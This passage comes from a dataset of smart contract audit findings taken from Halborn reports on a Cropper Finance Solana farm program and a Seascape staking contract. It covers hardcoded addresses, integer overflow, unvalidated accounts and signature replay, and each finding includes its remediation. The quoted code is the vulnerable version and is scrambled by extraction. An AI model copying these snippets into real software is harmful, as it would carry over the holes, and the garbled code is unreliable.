yield-farming-v1/program/src/ constants.rs. In case those addresses are compromised the program owner has no way of updating them, putting users funds at risk. Code Location: Listing 8: yield-farming-v1/program/src/constants.rs (Lines 19,23) 16 // / Fee owner wallet address 17 // / This includes harvest fee 18 // / So this wallet address should have all token accounts of registered token - list 19 pub const FEE_OWNER :& str = if DEVNET_MODE { \" BRmxAJ3ThceU2SXt6weyXarRNvAwZUtKuKbzSRneRxJn \"} else {\" 4 GJ3z4skEHJADz3MVeNYBg4YV8H27rBQey2YYdiPC8PA \" }; 20 21 // / This is allowed wallet address to create specified farms by site owner 22 // / Specified farms are SOL - USDC , SOL - CRP , USDT - CRP , USDC - CRP , ETH - USDC , ETH - CRP 23 pub const ALLOWED_CREATOR :& str = if DEVNET_MODE { \"4 GJ3z4skEHJADz3MVeNYBg4YV8H27rBQey2YYdiPC8PA \" } else { \" BRmxAJ3ThceU2SXt6weyXarRNvAwZUtKuKbzSRneRxJn \" }; Risk Level: Likelihood - 1 Impact - 5 24 Recommendations: Consider making the governance addresses modifiable and implement a func- tion to update these addresses in case they are compromised. Remediation Plan: SOLVED: Fixed in commit 643636779a5eac3a000e217406cbd8be479f6b4e. 25 ", "labels": ["Halborn", "Cropper_Finance_Farm_Solana_Program", "Severity: Medium"]}, {"title": "INTEGER OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "An overflow happens when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of digits. For example, in the pending_rewards function defined in state.rs two u64 values are multiplied without checking whether the result is within the range that can be represented with a given number of bits. If it isnt, in Rust the resulting value is specified to wrap as twos complement, resulting in a value either too low or too high considering the circumstances. Code Location: Listing 9: state.rs (Lines 66,71) 62 impl FarmPool { 63 64 65 66 // / get current pending reward amount for a user pub fn pending_rewards (& self , user_info :& mut UserInfo ) -> u64 { let reward_per_share_net : u64 = self . reward_per_share_net ; return user_info . deposit_balance * reward_per_share_net / REWARD_MULTIPLER - user_info . reward_debt ; 67 68 69 70 71 } // / get total reward amount for a user so far pub fn get_new_reward_debt (& self , user_info :& UserInfo ) -> u64 { return user_info . deposit_balance * self . reward_per_share_net / REWARD_MULTIPLER ; } 72 73 74 } Listing 10: processor.rs (Lines 669) 666 // update reward per second in the rest period from now 667 let duration = farm_pool . end_timestamp - cur_timestamp ; 668 let added_reward_per_second = amount / duration ; 26 669 farm_pool . reward_per_timestamp += added_reward_per_second ; Listing 11: processor.rs (Lines 770,771) return ; 759 // check if valid current timestamp 760 if farm_pool . last_timestamp >= cur_timestamp { 761 762 } 763 if lp_supply == 0 || farm_pool . reward_per_timestamp == 0 { 764 765 766 } 767 768 // update reward per share net and last distributed timestamp 769 let multiplier = cur_timestamp - farm_pool . last_timestamp ; 770 let reward = multiplier * farm_pool . reward_per_timestamp ; 771 farm_pool . reward_per_share_net = farm_pool . reward_per_share_net + farm_pool . last_timestamp = cur_timestamp ; return ; REWARD_MULTIPLER * reward / lp_supply ; 772 farm_pool . last_timestamp = cur_timestamp ; Risk Level: Likelihood - 3 Impact - 3 Recommendations: Consider replacing the multiplication and subtraction operators with Rusts checked_mul and checked_sub for 64bit unsigned integers. Remediation Plan: SOLVED: Fixed in commit c8aaf6386305947ec1d7c3c1a9aabf448ae2a92a. 27 ", "labels": ["Halborn", "Cropper_Finance_Farm_Solana_Program", "Severity: Medium"]}, {"title": "INITIALISING FARM WITH INVALID TOKEN ACCOUNTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "To be initialised, a farm requires two token accounts to be provided by the initialising user: an LP token account and a reward account. Neither of the accounts is verified not to be frozen, to match a relevant mint, or to have the farm authority be the transfer authority, therefore it is possible for a malicious user to create a frozen pool with tokens that cannot effectively be accessed. Additionally, the corresponding AMM account (also user-supplied) is not validated to be owned by the Swap program. Code Location: Listing 12: processor.rs (Lines 109,112,115,121) 105 // creator wallet account information 106 let creator_info = next_account_info ( account_info_iter ) ?; 107 108 // lp token account information to store lp token in the pool 109 let pool_lp_token_account_info = next_account_info ( account_info_iter ) ?; 110 111 // reward token account information to store reward token in the pool 112 let pool_reward_token_account_info = next_account_info ( account_info_iter ) ?; 113 114 // lp token ' s mint account information 115 let pool_mint_info = next_account_info ( account_info_iter ) ?; 116 117 // reward token 's mint account information 118 let reward_mint_info = next_account_info ( account_info_iter ) ?; 119 28 120 // amm account information what have lp token mint , token_a mint , token_b mint 121 let amm_id_info = next_account_info ( account_info_iter ) ?; Listing 13: processor.rs (Lines 207,210,216,222) 206 // initialize lp token account to store lp token 207 farm_pool . pool_lp_token_account = * pool_lp_token_account_info . key ; 208 209 // initialize reward token account to store reward token 210 farm_pool . pool_reward_token_account = * pool_reward_token_account_info . key ; 211 212 // store nonce to authorize this farm account 213 farm_pool . nonce = nonce ; 214 215 // store lp token mint address 216 farm_pool . pool_mint_address = * pool_mint_info . key ; 217 218 // store spl - token program address 219 farm_pool . token_program_id = * token_program_info . key ; 220 221 // store reward token mint address 222 farm_pool . reward_mint_address = * reward_mint_info . key ; Risk Level: Likelihood - 1 Impact - 2 Recommendations: Before initialising the farm, it is recommended to verify if both token accounts have the farm PDA as authority, match the relevant mints and if the state property of both token accounts is not Frozen. Validate the AMM account owner to match the Swap program ID. 29 Remediation Plan: SOLVED: Fixed in commit 3755e767c151ded394baa104994597fe615bbbf1. 30 ", "labels": ["Halborn", "Cropper_Finance_Farm_Solana_Program", "Severity: Informational"]}, {"title": "ADMIN CAN CHANGE SESSION DETAILS AFTER THE START OF A SESSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Testing revealed that the setType function allowed the owner of the con- tract to change details regarding running sessions. Should this privilege be abused or the private key of the owner be stolen, users might risk of burning their NFTs without their knowledge when unstaking. This is due to the function allowing to set the NFTs in a certain session to burn and whether users get a bonus by playing the game. Code Location: NewStakingSaloon.sol Lines# Listing 1 function setType ( uint256 _sessionId , bool _burn , bool _specify ) Session storage _session = sessions [ _sessionId ]; require ( block . timestamp <= ( _session . startTime + _session . 1 // change type about session 2  external onlyOwner { 3 4  period ) , \" saloon : session end \"); 5 6 7 _session . burn _session . specify = _specify ; = _burn ; } Risk Level: Likelihood - 1 Impact - 5 13 Recommendation: Halborn recommends that this function is removed so that it cannot be abused by the owner role. Remediation Plan: SOLVED: The Seascape team removed the function. 14 ", "labels": ["Halborn", "Seascape_New_Staking_Saloon", "Severity: Medium"]}, {"title": "NOT CHECKING BALANCE BEFORE AND AFTER UNTRUSTED TOKENS TRANSFERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "NOT CHECKING BALANCE BEFORE AND AFTER UNTRUSTED TOKENS TRANSFERS", "labels": ["Halborn", "Seascape_New_Staking_Saloon", "Severity: Medium"]}, {"title": "UNCHECKED CONTRACT BALANCE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Testing revealed that when a session is created, there are no checks to ensure that the contract balance is enough to pay the reward. This could lead to failed transactions when users unstake or claim their rewards. Code Location: NewStakingSaloon.sol Lines# 117-156 Listing 3 external onlyOwner address _rewardToken , uint256 _totalReward , uint256 _period , uint256 _startTime , address _verifier 1 function startSession ( 2 3 4 5 6 7 ) 8 9 10 { 11  address \" ); 12  Seassion should start in the future \"); 13  should be greater than 0\" ); 14  should be greater than 0\" ); 15  address \" ); 16 17 18  start when session is active \"); 19 if ( lastSessionId > 0) { } require ( _rewardToken != address (0) , \" Token can 't be zero require ( _startTime > block . timestamp , \" Seascape Staking : require ( _period > 0, \" Seascape Staking : Session duration require ( _totalReward > 0, \" Seascape Staking : Reward amount require ( _verifier != address (0) , \" verifier can 't be zero require (! isActive ( lastSessionId ) , \" Seascape Staking : Can 't 17 // // creating the session // // / @dev required CWS balance of this contract // require ( crowns . balanceOf ( address ( this ) ) >= _totalReward , \" uint256 _sessionId = sessionId . current () ; uint256 _rewardUnit = _totalReward . mul ( MULTIPLIER ). div ( _period 20 21 22  Seascape Staking : Not enough balance of Crowns for reward \") ; 23 24  --------------- -------------- ---- ---- --- ----------------------------  25 26  --------------- -------------- ---- ---- --- ----------------------------  27 28  ); 29 sessions [ _sessionId ] = Session ( _totalReward , _period ,  _startTime , 0, 0, _rewardUnit , 0, 0 , _startTime , true , false , 0) ; 30 31  --------------- -------------- ---- ---- --- ----------------------------  32 33  --------------- -------------- ---- ---- --- ----------------------------  34 35 36 37 38 39  _startTime + _period ); 40 } sessionId . increment () ; rewardToken = IERC20 ( _rewardToken ); lastSessionId = _sessionId ; verifier = _verifier ; // updating rest of session related data // emit SessionStarted ( _sessionId , _totalReward , _startTime , // Risk Level: Likelihood - 2 Impact - 2 18 Recommendation: Halborn recommends that a check is added to ensure that the contract balance is enough to pay rewards to the users. This could be implemented as follows: Listing 4 1 require ( rewardToken . balanceOf ( address ( this )) >= _totalReward ,  Seascape Staking : Not enough balance for reward \" ); \" Remediation Plan: SOLVED: The Seascape team amended the code to add contract balance checks. 19 ", "labels": ["Halborn", "Seascape_New_Staking_Saloon", "Severity: Low"]}, {"title": "COMMENTED OUT CODE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There are instances within the code where commented code is left from previous development iterations. While this does not cause any security concerns, it makes the contract less readable. Code Location: NewStakingSaloon.sol Lines# 137-138 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Halborn recommends that the code is removed to improve the readability of the code. Remediation Plan: SOLVED: The Seascape team removed commented code for readability. 20 ", "labels": ["Halborn", "Seascape_New_Staking_Saloon", "Severity: Informational"]}, {"title": "POSSIBLE SIGNATURE REPLAY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Within the NewStakingSaloon.sol smart contract, there are some occur- rences where signature replay attacks can be executed. While the contract logic would prevent any meaningful exploitation of those, there might be some extreme test cases which might introduce risks to the platform and their users. Code Location: NewStakingSaloon.sol Lines# 196-201  In the deposit function Listing 5 bytes32 _messageNoPrefix = keccak256 ( abi . encodePacked ( _nftId , { 1 2  _sp )); 3  Signed Message :\\ n32 \" , _messageNoPrefix )) ; 4 5  verification failed \" ); 6 } bytes32 _message = keccak256 ( abi . encodePacked (\" \\ x19Ethereum address _recover = ecrecover ( _message , _v , _r , _s ); require ( _recover == verifier , \" Nft Staking : Seascape points  In the verifyBonus function Listing 6 1 bytes32 _messageNoPrefix = keccak256 ( abi . encodePacked ( 2 3 _bonusPercent , _balance [0]. nftId , 21 _balance [1]. nftId , _balance [2]. nftId 4 5 6 )); 7 8 // / Validation of bonus 9 // / @dev 3. verify that signature for message was signed by  contract owner 10  Signed Message :\\ n32 \" , _messageNoPrefix )) ; 11 12  verification failed \" ); address _recover = ecrecover ( _message , _v , _r , _s ); require ( _recover == verifier , \" NFT Staking : Seascape points bytes32 _message = keccak256 ( abi . encodePacked ( \" \\ x19Ethereum Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to have a unique value in the signatures that always prevents the reuse of signatures. In this case, it is recommended to use a nonce value that would be stored on an account basis or to use msg.sender in the signature verification. This will prevent any other user from reusing previous signatures. Remediation Plan: SOLVED: The Seascape team added a nonce to the signature verification. 22 ", "labels": ["Halborn", "Seascape_New_Staking_Saloon", "Severity: Informational"]}, {"title": "USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the loop below, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. This does not only apply to the iterator variable. It also applies to variables declared within the loop code block. Code Location: NewStakingSaloon.sol Line #372-374 Listing 7 for ( uint _index = 0; _index < 3; _index ++) { _interests = _interests . add ( calculateInterest ( _sessionId , 1 2  msg . sender , _index )); 3 } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This applies to the iterator variable and to variables declared within the loop code block. 23 Remediation Plan: SOLVED: The Seascape team amended the code as suggested to optimize the contract. 24 ", "labels": ["Halborn", "Seascape_New_Staking_Saloon", "Severity: Informational"]}, {"title": "UPGRADE TO AT LEAST PRAGMA 0.8.10", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Gas optimizations and additional safety checks are available for free when using newer compiler versions and the optimizer.  Safemath by default since 0.8.0 (can be more gas efficient than the SafeMath library)  Low level inline: as of 0.8.2, leads to cheaper gas runtime. This is especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions and if they are not built in, they cost an additional 20 to 40 gas due to the 2 extra jump instructions and additional stack operations needed for function calls.  Optimizer improvements in packed structs: Before 0.8.3, storing packed structs, in some cases, used an additional storage read operation. After EIP-2929, if the slot was already cold, this means unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means additional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs.  Custom errors from 0.8.4, leads to cheaper deploy time cost and run time cost. Note: the run time cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors. Code Location: The contract within scope made use of the pragma version 0.6.7 Risk Level: Likelihood - 1 Impact - 1 25 Recommendation: Halborn recommends that the project is upgraded to use at least pragma 0.8.10. Remediation Plan: ACKNOWLEDGED: The Seascape team keeps the same version of the Solidity compiler. 26 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Seascape_New_Staking_Saloon", "Severity: Informational"]}]